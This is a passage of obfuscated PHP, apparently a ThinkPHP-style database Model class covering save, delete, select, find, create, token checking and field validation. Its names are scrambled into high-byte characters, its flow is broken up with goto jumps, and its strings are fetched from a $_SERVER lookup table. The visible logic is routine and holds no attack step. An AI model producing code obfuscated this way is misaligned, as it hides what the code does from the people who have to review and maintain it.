$this->_parseOptions($EÜ ²§éç); if (!1 === ($c—ìÒ¥¯Òµ = $this->db->selectInsert($Dç²ì‘˜Œî ? $Dç²ì‘˜Œî : $EÜ ²§éç[$bñ‡ÚÔÛµ„[261]], $eõÚ¥Òö‰ ? $eõÚ¥Òö‰ : $this->getTableName(), $EÜ ²§éç))) { $this->error = think_lang($bñ‡ÚÔÛµ„[262]); return !1; } else { return $c—ìÒ¥¯Òµ; } } public function save($eŒ»ø«È¸‡ = '', $cÜ³ÉœÃôŒ = array()) { goto BÛÇ—‹«…¢; BÛÇ—‹«…¢: $d¥¬’Ä›Û† =& $_SERVER[í™]; if (empty($eŒ»ø«È¸‡)) { if (!empty($this->data)) { $eŒ»ø«È¸‡ = $this->data; $this->data = array(); } else { $this->error = think_lang($d¥¬’Ä›Û†[259]); return !1; } } $eŒ»ø«È¸‡ = $this->_facade($eŒ»ø«È¸‡); goto EÎ¶¤ô¥è; EÎ¶¤ô¥è: $cÜ³ÉœÃôŒ = $this->_parseOptions($cÜ³ÉœÃôŒ); $cßïñÆ±á = $this->getPk(); if (!isset($cÜ³ÉœÃôŒ[$d¥¬’Ä›Û†[263]])) { if (isset($eŒ»ø«È¸‡[$cßïñÆ±á])) { $B‚‡£­ ‡á[$cßïñÆ±á] = $eŒ»ø«È¸‡[$cßïñÆ±á]; $cÜ³ÉœÃôŒ[$d¥¬’Ä›Û†[263]] = $B‚‡£­ ‡á; unset($eŒ»ø«È¸‡[$cßïñÆ±á]); } else { $this->error = think_lang($d¥¬’Ä›Û†[262]); return !1; } } goto a³Õß¯Ğ¡; FÖ‰ñø—: if (!1 !== $Eù›ìÈæÅ) { if (isset($cŒÍ¯Èôó‰)) { $eŒ»ø«È¸‡[$cßïñÆ±á] = $cŒÍ¯Èôó‰; } $this->_afterUpdate($eŒ»ø«È¸‡, $cÜ³ÉœÃôŒ); } return $Eù›ìÈæÅ; goto bÁâ¦Ü‹´£; a³Õß¯Ğ¡: if (is_array($cÜ³ÉœÃôŒ[$d¥¬’Ä›Û†[263]]) && isset($cÜ³ÉœÃôŒ[$d¥¬’Ä›Û†[263]][$cßïñÆ±á])) { $cŒÍ¯Èôó‰ = $cÜ³ÉœÃôŒ[$d¥¬’Ä›Û†[263]][$cßïñÆ±á]; } if (!1 === $this->_beforeUpdate($eŒ»ø«È¸‡, $cÜ³ÉœÃôŒ)) { return !1; } $Eù›ìÈæÅ = $this->db->update($eŒ»ø«È¸‡, $cÜ³ÉœÃôŒ); goto FÖ‰ñø—; bÁâ¦Ü‹´£: } protected function _beforeUpdate(&$BË™ğÒ“›ã, $f„İï¸¨°Õ) { } protected function _afterUpdate($f°ÜÛø¥ÁÌ, $Cá ºÒøŒ²) { } public function delete($aîŸ¯ïºƒ = array()) { goto C‰íÅñÇÑ³; F´‘ª¨ŸÈ: if (is_numeric($aîŸ¯ïºƒ) || is_string($aîŸ¯ïºƒ)) { if (strpos($aîŸ¯ïºƒ, $E‡™‚‚ÈÁï[47])) { $E‹øÖôğ’[$F„ÆÅäëİ] = array($E‡™‚‚ÈÁï[264], $aîŸ¯ïºƒ); } else { $E‹øÖôğ’[$F„ÆÅäëİ] = $aîŸ¯ïºƒ; } $this->options[$E‡™‚‚ÈÁï[263]] = $E‹øÖôğ’; } $aîŸ¯ïºƒ = $this->_parseOptions(); if (is_array($aîŸ¯ïºƒ[$E‡™‚‚ÈÁï[263]]) && isset($aîŸ¯ïºƒ[$E‡™‚‚ÈÁï[263]][$F„ÆÅäëİ])) { $fØœÎ¢»Ğ = $aîŸ¯ïºƒ[$E‡™‚‚ÈÁï[263]][$F„ÆÅäëİ]; } goto Bù¢™Ã¥÷; C‰íÅñÇÑ³: $E‡™‚‚ÈÁï =& $_SERVER[í™]; if (empty($aîŸ¯ïºƒ) && empty($this->options[$E‡™‚‚ÈÁï[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $F„ÆÅäëİ = $this->getPk(); goto F´‘ª¨ŸÈ; Bù¢™Ã¥÷: $DéÊôĞ»æ‚ = $this->db->delete($aîŸ¯ïºƒ); if (!1 !== $DéÊôĞ»æ‚) { $aµ”öÉŒê = array(); if (isset($fØœÎ¢»Ğ)) { $aµ”öÉŒê[$F„ÆÅäëİ] = $fØœÎ¢»Ğ; } $this->_after_delete($aµ”öÉŒê, $aîŸ¯ïºƒ); } return $DéÊôĞ»æ‚; goto ešÍ—ê×Ô; ešÍ—ê×Ô: } protected function _after_delete($D¶ø¾Âè…Œ, $EÎ–¦ß¥¡Ñ) { } public function select($FÁÛË‰Ñ¤ = array()) { goto B®¹®øÂº; DÀŠŒà‚êÏ: $this->_afterSelect($CâíĞÄ¸’¬, $FÁÛË‰Ñ¤); return $CâíĞÄ¸’¬; goto A‚Öó»õ—†; B®¹®øÂº: $B‹·âÖåãÄ =& $_SERVER[í™]; if (is_string($FÁÛË‰Ñ¤) || is_numeric($FÁÛË‰Ñ¤)) { $Eà»‡†øî = $this->getPk(); if (strpos($FÁÛË‰Ñ¤, $B‹·âÖåãÄ[47])) { $dˆ¥…˜Ô[$Eà»‡†øî] = array($B‹·âÖåãÄ[264], $FÁÛË‰Ñ¤); } else { $dˆ¥…˜Ô[$Eà»‡†øî] = $FÁÛË‰Ñ¤; } $this->options[$B‹·âÖåãÄ[263]] = $dˆ¥…˜Ô; } elseif (!1 === $FÁÛË‰Ñ¤) { $FÁÛË‰Ñ¤ = $this->_parseOptions(); return $B‹·âÖåãÄ[265] . $this->db->buildSelectSql($FÁÛË‰Ñ¤) . $B‹·âÖåãÄ[266]; } $FÁÛË‰Ñ¤ = $this->_parseOptions(); goto Dõëå«¸Î; Dõëå«¸Î: $CâíĞÄ¸’¬ = $this->db->select($FÁÛË‰Ñ¤); if (!1 === $CâíĞÄ¸’¬) { return !1; } if (empty($CâíĞÄ¸’¬)) { return null; } goto DÀŠŒà‚êÏ; A‚Öó»õ—†: } protected function _afterSelect(&$A¢ã…ƒåÄÁ, $BÔÎ¿Æí÷) { } public function buildSql($EÊŒ·ÔË‘© = array()) { $f½¡˜Ò¨‘á =& $_SERVER[í™]; $EÊŒ·ÔË‘© = $this->_parseOptions($EÊŒ·ÔË‘©); return $f½¡˜Ò¨‘á[265] . $this->db->buildSelectSql($EÊŒ·ÔË‘©) . $f½¡˜Ò¨‘á[266]; } public function optionsValue($cùôØ†™İÅ = null) { if (is_null($cùôØ†™İÅ)) { return $this->options; } elseif (is_array($cùôØ†™İÅ)) { $this->options = array_merge($this->options, $cùôØ†™İÅ); } } protected function _parseOptions($f¿ö‘†¼‹– = array()) { goto b‘âùˆ²¥ß; E´Ü¿»á: if (!isset($f¿ö‘†¼‹–[$fÌ¯õ éÃç[267]])) { $f¿ö‘†¼‹–[$fÌ¯õ éÃç[267]] = $this->getTableName(); $AŒ©èíö© = $this->fields; } else { $AŒ©èíö© = $this->getDbFields(); } if (!empty($f¿ö‘†¼‹–[$fÌ¯õ éÃç[268]])) { $f¿ö‘†¼‹–[$fÌ¯õ éÃç[267]] .= $fÌ¯õ éÃç[50] . $f¿ö‘†¼‹–[$fÌ¯õ éÃç[268]]; } $f¿ö‘†¼‹–[$fÌ¯õ éÃç[269]] = $this->name; goto c¤¬÷Ú¿±‹; c¤¬÷Ú¿±‹: if (isset($f¿ö‘†¼‹–[$fÌ¯õ éÃç[263]]) && is_array($f¿ö‘†¼‹–[$fÌ¯õ éÃç[263]]) && !empty($AŒ©èíö©) && !isset($f¿ö‘†¼‹–[$fÌ¯õ éÃç[270]]) && !isset($f¿ö‘†¼‹–[$fÌ¯õ éÃç[267]])) { foreach ($f¿ö‘†¼‹–[$fÌ¯õ éÃç[263]] as $eï²¶¹ÑåŠ => $F’“¥÷¸‡ä) { $eï²¶¹ÑåŠ = trim($eï²¶¹ÑåŠ); if (in_array($eï²¶¹ÑåŠ, $AŒ©èíö©, !0)) { if (is_scalar($F’“¥÷¸‡ä)) { $this->_parseType($f¿ö‘†¼‹–[$fÌ¯õ éÃç[263]], $eï²¶¹ÑåŠ); } } elseif (!is_numeric($eï²¶¹ÑåŠ) && $fÌ¯õ éÃç[70] != substr($eï²¶¹ÑåŠ, 0, 1) && !1 === strpos($eï²¶¹ÑåŠ, $fÌ¯õ éÃç[91]) && !1 === strpos($eï²¶¹ÑåŠ, $fÌ¯õ éÃç[248]) && !1 === strpos($eï²¶¹ÑåŠ, $fÌ¯õ éÃç[271]) && !1 === strpos($eï²¶¹ÑåŠ, $fÌ¯õ éÃç[272])) { unset($f¿ö‘†¼‹–[$fÌ¯õ éÃç[263]][$eï²¶¹ÑåŠ]); } } } $this->_options_filter($f¿ö‘†¼‹–); return $f¿ö‘†¼‹–; goto a‘»‰Ê›±ğ; b‘âùˆ²¥ß: $fÌ¯õ éÃç =& $_SERVER[í™]; if (is_array($f¿ö‘†¼‹–)) { $f¿ö‘†¼‹– = array_merge($this->options, $f¿ö‘†¼‹–); } $this->options = array(); goto E´Ü¿»á; a‘»‰Ê›±ğ: } protected function _options_filter(&$fåØÁãÜ¯Ÿ) { } protected function _parseType(&$eÎ·Ò‰·µ, $Dîµ©•Îï«) { $A±²ØÎ‹¯ =& $_SERVER[í™]; if (empty($this->options[$A±²ØÎ‹¯[273]][$A±²ØÎ‹¯[4] . $Dîµ©•Îï«])) { $CÇÒù³ÉË† = strtolower($this->fields[$A±²ØÎ‹¯[240]][$Dîµ©•Îï«]); if (!1 !== strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[274])) { } elseif (!1 === strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[275]) && !1 !== strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[276])) { $eÎ·Ò‰·µ[$Dîµ©•Îï«] = intval($eÎ·Ò‰·µ[$Dîµ©•Îï«]); } elseif (!1 !== strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[277]) || !1 !== strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[278])) { $eÎ·Ò‰·µ[$Dîµ©•Îï«] = floatval($eÎ·Ò‰·µ[$Dîµ©•Îï«]); } elseif (!1 !== strpos($CÇÒù³ÉË†, $A±²ØÎ‹¯[279])) { $eÎ·Ò‰·µ[$Dîµ©•Îï«] = (bool) $eÎ·Ò‰·µ[$Dîµ©•Îï«]; } } } public function find($A‰÷œğ¼¥È = array()) { goto B§§Û„ïÆƒ; AºãŠ©ë‹¬: if (!empty($this->options[$E„äå„Šë[281]])) { return $this->returnResult($this->data, $this->options[$E„äå„Šë[281]]); } return $this->data; goto BåÙÓŸ²ÛÇ; BÃ†ôâ»ˆ—: $A‰÷œğ¼¥È = $this->_parseOptions(); $b´ö‘º°Çõ = $this->db->select($A‰÷œğ¼¥È); if (!1 === $b´ö‘º°Çõ) { return !1; } goto eÏ¶äå; eÏ¶äå: if (empty($b´ö‘º°Çõ)) { return null; } $this->data = $b´ö‘º°Çõ[0]; $this->_afterFind($this->data, $A‰÷œğ¼¥È); goto AºãŠ©ë‹¬; B§§Û„ïÆƒ: $E„äå„Šë =& $_SERVER[í™]; if (is_numeric($A‰÷œğ¼¥È) || is_string($A‰÷œğ¼¥È)) { $CÊ¤¥§È¯[$this->getPk()] = intval($A‰÷œğ¼¥È); $this->options[$E„äå„Šë[263]] = $CÊ¤¥§È¯; } $this->options[$E„äå„Šë[280]] = 1; goto BÃ†ôâ»ˆ—; BåÙÓŸ²ÛÇ: } protected function _afterFind(&$f¹¢ÌÀñğº, $bœˆù¼ÅŒ) { } protected function returnResult($cíë§†áÖÃ, $dó˜â¦øˆ = '') { $D¼¼Àº¬¯š =& $_SERVER[í™]; if ($dó˜â¦øˆ) { if (is_callable($dó˜â¦øˆ)) { return call_user_func($dó˜â¦øˆ, $cíë§†áÖÃ); } switch (strtolower($dó˜â¦øˆ)) { case $D¼¼Àº¬¯š[282]: return json_encode($cíë§†áÖÃ); case $D¼¼Àº¬¯š[283]: return xml_encode($cíë§†áÖÃ); } } return $cíë§†áÖÃ; } public function parseFieldsMap($fŸ³¬Á¶ù, $CÉ‰™Ò¯¡¼ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $dùçç«»ù => $eŠŠÌ•ÅÖ) { if ($CÉ‰™Ò¯¡¼ == 1) { if (isset($fŸ³¬Á¶ù[$eŠŠÌ•ÅÖ])) { $fŸ³¬Á¶ù[$dùçç«»ù] = $fŸ³¬Á¶ù[$eŠŠÌ•ÅÖ]; unset($fŸ³¬Á¶ù[$eŠŠÌ•ÅÖ]); } } else { if (isset($fŸ³¬Á¶ù[$dùçç«»ù])) { $fŸ³¬Á¶ù[$eŠŠÌ•ÅÖ] = $fŸ³¬Á¶ù[$dùçç«»ù]; unset($fŸ³¬Á¶ù[$dùçç«»ù]); } } } } return $fŸ³¬Á¶ù; } public function setField($dÂ¶—“ Ê , $C‚‘…ÄÊæ = '') { if (is_array($dÂ¶—“ Ê )) { $bƒÜÇãùãƒ = $dÂ¶—“ Ê ; } else { $bƒÜÇãùãƒ[$dÂ¶—“ Ê ] = $C‚‘…ÄÊæ; } return $this->save($bƒÜÇãùãƒ); } public function setAdd($E°à™—–ó‚, $fÂ¿ø¢Ä•­ = 1) { $eÕ®÷è™¶ =& $_SERVER[í™]; $fáâïÃ¿ãï = $E°à™—–ó‚ . $eÕ®÷è™¶[284] . $fÂ¿ø¢Ä•­; if ($fÂ¿ø¢Ä•­ < 0) { $fáâïÃ¿ãï = $E°à™—–ó‚ . $fÂ¿ø¢Ä•­; } return $this->setField($E°à™—–ó‚, array($eÕ®÷è™¶[285], $fáâïÃ¿ãï)); } public function getField($eø¡Ù°ù­•, $d¢‘±ì¸˜ = null) { $E°’âôšá« =& $_SERVER[í™]; $E‘ïÔÒ†öÔ[$E°’âôšá«[261]] = $eø¡Ù°ù­•; $E‘ïÔÒ†öÔ = $this->_parseOptions($E‘ïÔÒ†öÔ); $eø¡Ù°ù­• = trim($eø¡Ù°ù­•); if (strpos($eø¡Ù°ù­•, $E°’âôšá«[47])) { if (!isset($E‘ïÔÒ†öÔ[$E°’âôšá«[280]])) { $E‘ïÔÒ†öÔ[$E°’âôšá«[280]] = is_numeric($d¢‘±ì¸˜) ? $d¢‘±ì¸˜ : $E°’âôšá«[33]; } $a¯¥”„¼¾ = $this->db->select($E‘ïÔÒ†öÔ); if (!empty($a¯¥”„¼¾)) { goto b„„·™ÊÚå; eãÁŸÖ÷¦—: $A­ëÜö£ğ“ = array_shift($eø¡Ù°ù­•); $e„‡ùìˆƒ  = array(); $D¥“Æğœ˜– = count($AÌ³µÈŠ‘); goto A²ÒÒÃ÷£ƒ; b„„·™ÊÚå: $AÌ³µÈŠ‘ = explode($E°’âôšá«[47], $eø¡Ù°ù­•); $eø¡Ù°ù­• = array_keys($a¯¥”„¼¾[0]); $díßùˆ¶ = array_shift($eø¡Ù°ù­•); goto eãÁŸÖ÷¦—; A²ÒÒÃ÷£ƒ: foreach ($a¯¥”„¼¾ as $Fæ›Òõ«Êå) { $dÃ¡æÔï = $Fæ›Òõ«Êå[$díßùˆ¶]; if (2 == $D¥“Æğœ˜–) { $e„‡ùìˆƒ [$dÃ¡æÔï] = $Fæ›Òõ«Êå[$A­ëÜö£ğ“]; } else { $e„‡ùìˆƒ [$dÃ¡æÔï] = is_string($d¢‘±ì¸˜) ? implode($d¢‘±ì¸˜, $Fæ›Òõ«Êå) : $Fæ›Òõ«Êå; } } return $e„‡ùìˆƒ ; goto CÒÏ’Œ; CÒÏ’Œ: } } else { if (!0 !== $d¢‘±ì¸˜) { $E‘ïÔÒ†öÔ[$E°’âôšá«[280]] = is_numeric($d¢‘±ì¸˜) ? $d¢‘±ì¸˜ : 1; } if ($d¢‘±ì¸˜ === $E°’âôšá«[243]) { unset($E‘ïÔÒ†öÔ[$E°’âôšá«[280]]); } $Fæ›Òõ«Êå = $this->db->select($E‘ïÔÒ†öÔ); if (!empty($Fæ›Òõ«Êå)) { if ($d¢‘±ì¸˜ === $E°’âôšá«[243]) { return reset($Fæ›Òõ«Êå[0]); } if (!0 !== $d¢‘±ì¸˜ && 1 == $E‘ïÔÒ†öÔ[$E°’âôšá«[280]]) { return reset($Fæ›Òõ«Êå[0]); } foreach ($Fæ›Òõ«Êå as $d»±óë¡‡³) { $fãéÔÜÜ–[] = $d»±óë¡‡³[$eø¡Ù°ù­•]; } return $fãéÔÜÜ–; } } return null; } public function create($A¬Şøå„†æ = '', $bĞ„¾—ïÜ‹ = '') { goto FŸŒèÓ–ô…; dˆ–±áçÂ·: $A¬Şøå„†æ = $this->parseFieldsMap($A¬Şøå„†æ, 0); $bĞ„¾—ïÜ‹ = $bĞ„¾—ïÜ‹ ? $bĞ„¾—ïÜ‹ : (!empty($A¬Şøå„†æ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$d¿èÒÌÍÄã[261]])) { $aè„‚×… = $this->options[$d¿èÒÌÍÄã[261]]; unset($this->options[$d¿èÒÌÍÄã[261]]); } elseif ($bĞ„¾—ïÜ‹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $aè„‚×… = $this->insertFields; } elseif ($bĞ„¾—ïÜ‹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aè„‚×… = $this->updateFields; } goto cµ»¹«–î; FÕ›²êßêò: return $A¬Şøå„†æ; goto a—¼…¯“¨Ñ; FŸŒèÓ–ô…: $d¿èÒÌÍÄã =& $_SERVER[í™]; if (empty($A¬Şøå„†æ)) { $A¬Şøå„†æ = $_POST; } elseif (is_object($A¬Şøå„†æ)) { $A¬Şøå„†æ = get_object_vars($A¬Şøå„†æ); } if (empty($A¬Şøå„†æ) || !is_array($A¬Şøå„†æ)) { $this->error = think_lang($d¿èÒÌÍÄã[259]); return !1; } goto dˆ–±áçÂ·; bå›¤·ÒéĞ: if ($this->autoCheckFields) { $aè„‚×… = $this->getDbFields(); foreach ($A¬Şøå„†æ as $B¹·÷² ¿› => $f„‚‰Æ¿¯) { if (!in_array($B¹·÷² ¿›, $aè„‚×…)) { unset($A¬Şøå„†æ[$B¹·÷² ¿›]); } elseif (MAGIC_QUOTES_GPC && is_string($f„‚‰Æ¿¯)) { $A¬Şøå„†æ[$B¹·÷² ¿›] = stripslashes($f„‚‰Æ¿¯); } } } $this->autoOperation($A¬Şøå„†æ, $bĞ„¾—ïÜ‹); $this->data = $A¬Şøå„†æ; goto FÕ›²êßêò; cµ»¹«–î: if (isset($aè„‚×…)) { if (is_string($aè„‚×…)) { $aè„‚×… = explode($d¿èÒÌÍÄã[47], $aè„‚×…); } if (think_config($d¿èÒÌÍÄã[286])) { $aè„‚×…[] = think_config($d¿èÒÌÍÄã[287]); } foreach ($A¬Şøå„†æ as $B¹·÷² ¿› => $f„‚‰Æ¿¯) { if (!in_array($B¹·÷² ¿›, $aè„‚×…)) { unset($A¬Şøå„†æ[$B¹·÷² ¿›]); } } } if (!$this->autoValidation($A¬Şøå„†æ, $bĞ„¾—ïÜ‹)) { return !1; } if (!$this->autoCheckToken($A¬Şøå„†æ)) { $this->error = think_lang($d¿èÒÌÍÄã[288]); return !1; } goto bå›¤·ÒéĞ; a—¼…¯“¨Ñ: } public function autoCheckToken($Bë°è©–šª) { $DçÌ»İ¿í =& $_SERVER[í™]; if (isset($this->options[$DçÌ»İ¿í[289]]) && !$this->options[$DçÌ»İ¿í[289]]) { return !0; } if (think_config($DçÌ»İ¿í[286])) { $E“¨‰¾Åƒ¨ = think_config($DçÌ»İ¿í[287]); if (!isset($Bë°è©–šª[$E“¨‰¾Åƒ¨]) || Session::get($E“¨‰¾Åƒ¨)) { return !1; } list($c¸ê¹ê±Ü«, $EøŞŸõ¡•Å) = explode($DçÌ»İ¿í[70], $Bë°è©–šª[$E“¨‰¾Åƒ¨]); if ($EøŞŸõ¡•Å && Session::get($E“¨‰¾Åƒ¨ . $DçÌ»İ¿í[91] . $c¸ê¹ê±Ü«) === $EøŞŸõ¡•Å) { Session::remove($E“¨‰¾Åƒ¨ . $DçÌ»İ¿í[91] . $c¸ê¹ê±Ü«); return !0; } if (think_config($DçÌ»İ¿í[290])) { Session::remove($E“¨‰¾Åƒ¨ . $DçÌ»İ¿í[91] . $c¸ê¹ê±Ü«); } return !1; } return !0; } public function regex($F•ªèˆôô×, $dá­ÙÅáÁà) { $eœºøùéÙ =& $_SERVER[í™]; $AëÉÉ‡“Ÿ† = array($eœºøùéÙ[291] => $eœºøùéÙ[292], $eœºøùéÙ[293] => $eœºøùéÙ[294], $eœºøùéÙ[295] => $eœºøùéÙ[296], $eœºøùéÙ[297] => $eœºøùéÙ[298], $eœºøùéÙ[299] => $eœºøùéÙ[300], $eœºøùéÙ[301] => $eœºøùéÙ[302], $eœºøùéÙ[303] => $eœºøùéÙ[304], $eœºøùéÙ[278] => $eœºøùéÙ[305], $eœºøùéÙ[306] => $eœºøùéÙ[307]); if (isset($AëÉÉ‡“Ÿ†[strtolower($dá­ÙÅáÁà)])) { $dá­ÙÅáÁà = $AëÉÉ‡“Ÿ†[strtolower($dá­ÙÅáÁà)]; } return preg_match($dá­ÙÅáÁà, $F•ªèˆôô×) === 1; } private function autoOperation(&$CÜÚ¶¨½Ã‚, $AÁö´“È£») { $añÉø‚¨”ƒ =& $_SERVER[í™]; if (!empty($this->options[$añÉø‚¨”ƒ[308]])) { $e…Ã¿ÉÃòÀ = $this->options[$añÉø‚¨”ƒ[308]]; unset($this->options[$añÉø‚¨”ƒ[308]]); } elseif (!empty($this->_auto)) { $e…Ã¿ÉÃòÀ = $this->_auto; } if (isset($e…Ã¿ÉÃòÀ)) { foreach ($e…Ã¿ÉÃòÀ as $c±´ÂøŠá¤) { if (empty($c±´ÂøŠá¤[2])) { $c±´ÂøŠá¤[2] = THINK_MODEL_INSERT; } if ($AÁö´“È£» == $c±´ÂøŠá¤[2] || $c±´ÂøŠá¤[2] == THINK_MODEL_BOTH) { switch (trim($c±´ÂøŠá¤[3])) { case $añÉø‚¨”ƒ[309]: case $añÉø‚¨”ƒ[310]: $bÒçØÛ«—¦ = isset($c±´ÂøŠá¤[4]) ? (array) $c±´ÂøŠá¤[4] : array(); if (isset($CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]])) { array_unshift($bÒçØÛ«—¦, $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]]); } if ($añÉø‚¨”ƒ[309] == $c±´ÂøŠá¤[3]) { $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]] = call_user_func_array($c±´ÂøŠá¤[1], $bÒçØÛ«—¦); } else { $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]] = call_user_func_array(array(&$this, $c±´ÂøŠá¤[1]), $bÒçØÛ«—¦); } break; case $añÉø‚¨”ƒ[261]: $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]] = $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[1]]; break; case $añÉø‚¨”ƒ[311]: if ($añÉø‚¨”ƒ[33] === $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]]) { unset($CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]]); } break; case $añÉø‚¨”ƒ[312]: default: $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]] = $c±´ÂøŠá¤[1]; } if (!1 === $CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]]) { unset($CÜÚ¶¨½Ã‚[$c±´ÂøŠá¤[0]]); } } } } return $CÜÚ¶¨½Ã‚; } protected function autoValidation($CæÜ¤›…§´, $FéÑ¸›È«) { $AõÈ˜˜öº˜ =& $_SERVER[í™]; if (!empty($this->options[$AõÈ˜˜öº˜[313]])) { $a Š³Ê¡èÆ = $this->options[$AõÈ˜˜öº˜[313]]; unset($this->options[$AõÈ˜˜öº˜[313]]); } elseif (!empty($this->_validate)) { $a Š³Ê¡èÆ = $this->_validate; } if (isset($a Š³Ê¡èÆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($a Š³Ê¡èÆ as $dŒÏÂ†“è² => $Bçîäì¾§å) { if (empty($Bçîäì¾§å[5]) || $Bçîäì¾§å[5] == THINK_MODEL_BOTH || $Bçîäì¾§å[5] == $FéÑ¸›È«) { if (0 == strpos($Bçîäì¾§å[2], $AõÈ˜˜öº˜[314]) && strpos($Bçîäì¾§å[2], $AõÈ˜˜öº˜[315])) { $Bçîäì¾§å[2] = think_lang(substr($Bçîäì¾§å[2], 2, -1)); } $Bçîäì¾§å[3] = isset($Bçîäì¾§å[3]) ? $Bçîäì¾§å[3] : THINK_EXISTS_VALIDATE; $Bçîäì¾§å[4] = isset($Bçîäì¾§å[4]) ? $Bçîäì¾§å[4] : $AõÈ˜˜öº˜[316]; switch ($Bçîäì¾§å[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CæÜ¤›…§´, $Bçîäì¾§å)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($AõÈ˜˜öº˜[33] != trim($CæÜ¤›…§´[$Bçîäì¾§å[0]])) { if (!1 === $this->_validationField($CæÜ¤›…§´, $Bçîäì¾§å)) { return !1; } } break; default: if (isset($CæÜ¤›…§´[$Bçîäì¾§å[0]])) { if (!1 === $this->_validationField($CæÜ¤›…§´, $Bçîäì¾§å)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($B²ÃÉØ¤½É, $C‡·»Ç¾ñ) { if (!1 === $this->_validationFieldItem($B²ÃÉØ¤½É, $C‡·»Ç¾ñ)) { if ($this->patchValidate) { $this->error[$C‡·»Ç¾ñ[0]] = $C‡·»Ç¾ñ[2]; } else { $this->error = $C‡·»Ç¾ñ[2]; return !1; } } return; } protected function _validationFieldItem($a‹£Ó£×î¡, $cŒŸÒñ–) { $BøÎ÷Œ½ƒà =& $_SERVER[í™]; switch (strtolower(trim($cŒŸÒñ–[4]))) { case $BøÎ÷Œ½ƒà[309]: case $BøÎ÷Œ½ƒà[310]: $cÛ¦¸Ì²…› = isset($cŒŸÒñ–[6]) ? (array) $cŒŸÒñ–[6] : array(); if (is_string($cŒŸÒñ–[0]) && strpos($cŒŸÒñ–[0], $BøÎ÷Œ½ƒà[47])) { $cŒŸÒñ–[0] = explode($BøÎ÷Œ½ƒà[47], $cŒŸÒñ–[0]); } if (is_array($cŒŸÒñ–[0])) { foreach ($cŒŸÒñ–[0] as $f¥³èµ±†¡) { $bŸáö«Â…Ù[$f¥³èµ±†¡] = $a‹£Ó£×î¡[$f¥³èµ±†¡]; } array_unshift($cÛ¦¸Ì²…›, $bŸáö«Â…Ù); } else { array_unshift($cÛ¦¸Ì²…›, $a‹£Ó£×î¡[$cŒŸÒñ–[0]]); } if ($BøÎ÷Œ½ƒà[309] == $cŒŸÒñ–[4]) { return call_user_func_array($cŒŸÒñ–[1], $cÛ¦¸Ì²…›); } else { return call_user_func_array(array(&$this, $cŒŸÒñ–[1]), $cÛ¦¸Ì²…›); } case $BøÎ÷Œ½ƒà[317]: return $a‹£Ó£×î¡[$cŒŸÒñ–[0]] == $a‹£Ó£×î¡[$cŒŸÒñ–[1]]; case $BøÎ÷Œ½ƒà[318]: if (is_string($cŒŸÒñ–[0]) && strpos($cŒŸÒñ–[0], $BøÎ÷Œ½ƒà[47])) { $cŒŸÒñ–[0] = explode($BøÎ÷Œ½ƒà[47], $cŒŸÒñ–[0]); } $F¢¥ãÇÓÈ = array(); if (is_array($cŒŸÒñ–[0])) { foreach ($cŒŸÒñ–[0] as $f¥³èµ±†¡) { $F¢¥ãÇÓÈ[$f¥³èµ±†¡] = $a‹£Ó£×î¡[$f¥³èµ±†¡]; } } else { $F¢¥ãÇÓÈ[$cŒŸÒñ–[0]] = $a‹£Ó£×î¡[$cŒŸÒñ–[0]]; } if (!empty($a‹£Ó£×î¡[$this->getPk()])) { $F¢¥ãÇÓÈ[$this->getPk()] = array($BøÎ÷Œ½ƒà[319], $a‹£Ó£×î¡[$this->getPk()]); } if ($this->where($F¢¥ãÇÓÈ)->find()) { return !1; } return !0; default: return $this->check($a‹£Ó£×î¡[$cŒŸÒñ–[0]], $cŒŸÒñ–[1], $cŒŸÒñ–[4]); } } public function check($cœÊ›ğ¤, $eËõø¾åÙÑ, $FåÂ¬ƒš½µ = "\x72\x65\147\x65\x78") { $aºè£õ‡§ =& $_SERVER[í™]; $FåÂ¬ƒš½µ = strtolower(trim($FåÂ¬ƒš½µ)); switch ($FåÂ¬ƒš½µ) { case $aºè£õ‡§[7]: case $aºè£õ‡§[320]: $d¡š…‹« = is_array($eËõø¾åÙÑ) ? $eËõø¾åÙÑ : explode($aºè£õ‡§[47], $eËõø¾åÙÑ); return $FåÂ¬ƒš½µ == $aºè£õ‡§[7] ? in_array($cœÊ›ğ¤, $d¡š…‹«) : !in_array($cœÊ›ğ¤, $d¡š…‹«); case $aºè£õ‡§[321]: case $aºè£õ‡§[322]: if (is_array($eËõø¾åÙÑ)) { $BôËÄŠ§Ğ = $eËõø¾åÙÑ[0]; $b—ïõ™¿Êô = $eËõø¾åÙÑ[1]; } else { list($BôËÄŠ§Ğ, $b—ïõ™¿Êô) = explode($aºè£õ‡§[47], $eËõø¾åÙÑ); } return $FåÂ¬ƒš½µ == $aºè£õ‡§[321] ? $cœÊ›ğ¤ >= $BôËÄŠ§Ğ && $cœÊ›ğ¤ <= $b—ïõ™¿Êô : $cœÊ›ğ¤ < $BôËÄŠ§Ğ || $cœÊ›ğ¤ > $b—ïõ™¿Êô; case $aºè£õ‡§[323]: case $aºè£õ‡§[324]: return $FåÂ¬ƒš½µ == $aºè£õ‡§[323] ? $cœÊ›ğ¤ == $eËõø¾åÙÑ : $cœÊ›ğ¤ != $eËõø¾åÙÑ; case $aºè£õ‡§[325]: $cÛÍ  